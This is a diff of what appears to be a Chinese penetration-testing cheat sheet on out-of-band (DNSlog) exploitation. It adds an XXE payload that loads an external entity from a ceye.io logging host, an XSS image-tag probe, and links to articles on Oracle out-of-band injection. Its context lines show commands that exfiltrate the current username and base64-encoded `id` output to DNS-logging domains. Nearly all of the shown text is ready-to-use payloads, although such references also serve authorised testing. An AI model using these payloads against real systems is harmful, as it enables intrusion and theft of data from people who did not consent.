@@ -154,7 +154,18 @@ ping %USERNAME%.b182oj.ceye.io
 
 ### SSRF
 
+
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test">
+%remote;]>
+<root/>
+```
+
 ### XSS
+`><img src=http://xss.xxxx.ceye.io/aaa>`
 
 
 
@@ -235,3 +246,7 @@ curl http://xxx.dnslog.link/`id|base64`
 [渗透技巧-mssql盲注与dnslog的完美结合(命令执行)](http://lawlietweb.com/2019/01/11/mssql%E7%9B%B2%E6%B3%A8%E4%B8%8Ednslog%E7%9A%84%E5%AE%8C%E7%BE%8E%E7%BB%93%E5%90%88(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/)
 
 [HawkEye Log/Dns 在Sql注入中的应用](http://docs.hackinglab.cn/HawkEye-Log-Dns-Sqli.html)
+
+[Oracle注入之带外通信](https://www.cnblogs.com/-qing-/p/10952341.html)
+
+[带外通道技术（OOB）总结](https://www.freebuf.com/articles/web/201013.html)
